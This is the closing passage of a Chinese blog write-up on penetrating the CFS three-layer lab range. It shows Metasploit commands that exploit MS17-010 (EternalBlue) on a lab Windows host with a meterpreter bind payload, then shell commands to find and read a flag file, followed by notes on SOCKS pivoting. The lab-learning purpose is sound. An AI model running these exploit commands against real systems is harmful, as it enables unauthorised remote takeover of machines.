+<p>445端口开放、并且是Windows系统，也许可能存在永恒之蓝</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_2.png" alt></p>
+<p>成功拿到sessions后就可以执行任意命令了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chcp 65001  # 如果出现乱码，输入这个修改编码即可</span><br></pre></td></tr></table></figure>
+<p>然后就是寻找flag文件即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd / # 回到根目录</span><br><span class="line">dir *flag* /s /b</span><br><span class="line"><span class="meta">#</span><span class="bash"> /s是指列出当前目录包含子目录下的所有文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /b是列出文件名称</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_3.png" alt></p>
+<p>最后用type命令进行查看</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/5_4.png" alt></p>
+<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><ol>
+<li>第一次搭建内网靶场环境，不是很熟悉，搭了一晚上才搭好。</li>
+<li>打靶机的过程也花了好长时间，msf不知道为什么第一个session总是断开；而连接第二个靶机时总是不稳定、蚁剑时而连的上时而连不上。</li>
+<li>内网漫游：配置socks代理、通过第一个已建立起来的session去访问其内网下的主机。</li>
+<li>两台主机通过走代理来通信是无法ping通的。</li>
+</ol>
+<h1 id="七、参考文章"><a href="#七、参考文章" class="headerlink" title="七、参考文章"></a>七、参考文章</h1><p><a target="_blank" rel="noopener" href="https://teamssix.com/191021-211425.html#toc-heading-6">CFS三层靶机搭建及其内网渗透【附靶场环境】 | TeamsSix</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61237064/article/details/125602997"> CFS三层靶机搭建及其内网渗透_ZredamanJ的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/326772.html">代理技术应用之三层内网漫游 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/59535740">内网漫游之SOCKS代理大结局 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/126514312">论后渗透MSF之 | 添加路由和代理<em>msf添加路由</em>迷途羔羊pro的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/166375631">linux命令行代理神器-proxychains - 知乎 (zhihu.com)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://cgrona.top">cgrona</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cgrona.top/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">https://cgrona.top/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cgrona.top" target="_blank">风清竹喧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a></div><div class="post_share"><div class="social-share" data-image="https://img.cgrona.top/Blog_img/30.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"><img class="next-cover" src="https://img.cgrona.top/Blog_img/10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">内网安全</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/08/Vulnhub-DC-1/" title="Vulnhub-DC-1渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/23.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-08</div><div class="title">Vulnhub-DC-1渗透学习</div></div></a></div><div><a href="/2022/06/09/Vulnhub-DC-2/" title="Vulnhub-DC-2渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-09</div><div class="title">Vulnhub-DC-2渗透学习</div></div></a></div><div><a href="/2022/06/11/Vulnhub-DC-3/" title="Vulnhub-DC-3渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/26.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-11</div><div class="title">Vulnhub-DC-3渗透学习</div></div></a></div><div><a href="/2022/07/04/Vulnhub-DC-4/" title="Vulnhub-DC-4渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/27.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-04</div><div class="title">Vulnhub-DC-4渗透学习</div></div></a></div><div><a href="/2022/07/07/Vulnhub-DC-5/" title="Vulnhub-DC-5渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-07</div><div class="title">Vulnhub-DC-5渗透学习</div></div></a></div><div><a href="/2022/08/14/Vulnhub-DC-7/" title="Vulnhub-DC-7渗透学习"><img class="cover" src="https://img.cgrona.top/Blog_img/28.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">Vulnhub-DC-7渗透学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cgrona</div><div class="author-info__description">选择有时候比努力更重要</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cgrona"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cgrona" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1549692438@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎阅读😊</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">一、靶场环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">二、环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE"><span class="toc-text">1、网卡配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%AE%9D%E5%A1%94%E9%85%8D%E7%BD%AE"><span class="toc-text">2、宝塔配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81Target1"><span class="toc-text">三、Target1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Target2"><span class="toc-text">四、Target2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81Target3"><span class="toc-text">五、Target3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">六、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">七、参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机内网渗透"><img src="https://img.cgrona.top/Blog_img/30.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CFS三层靶机内网渗透"/></a><div class="content"><a class="title" href="/2023/02/27/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" title="CFS三层靶机内网渗透">CFS三层靶机内网渗透</a><time datetime="2023-02-27T06:03:14.000Z" title="发表于 2023-02-27 14:03:14">2023-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全"><img src="https://img.cgrona.top/Blog_img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全"/></a><div class="content"><a class="title" href="/2022/10/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">内网安全</a><time datetime="2022-10-26T04:36:40.000Z" title="发表于 2022-10-26 12:36:40">2022-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/07/VMnet/" title="桥接模式、NAT模式和仅主机模式"><img src="https://img.cgrona.top/Blog_img/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="桥接模式、NAT模式和仅主机模式"/></a><div class="content"><a class="title" href="/2022/10/07/VMnet/" title="桥接模式、NAT模式和仅主机模式">桥接模式、NAT模式和仅主机模式</a><time datetime="2022-10-07T05:29:04.000Z" title="发表于 2022-10-07 13:29:04">2022-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/" title="传输文件还原"><img src="https://img.cgrona.top/Blog_img/29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="传输文件还原"/></a><div class="content"><a class="title" href="/2022/10/04/%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E8%BF%98%E5%8E%9F/" title="传输文件还原">传输文件还原</a><time datetime="2022-10-04T02:12:28.000Z" title="发表于 2022-10-04 10:12:28">2022-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/30/RCE/" title="RCE绕过"><img src="https://img.cgrona.top/Blog_img/8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RCE绕过"/></a><div class="content"><a class="title" href="/2022/09/30/RCE/" title="RCE绕过">RCE绕过</a><time datetime="2022-09-30T07:16:46.000Z" title="发表于 2022-09-30 15:16:46">2022-09-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By cgrona</div><div class="icp"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img class="icp-icon" src="/img/2022002701.png"/><span>桂ICP备2022002701号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
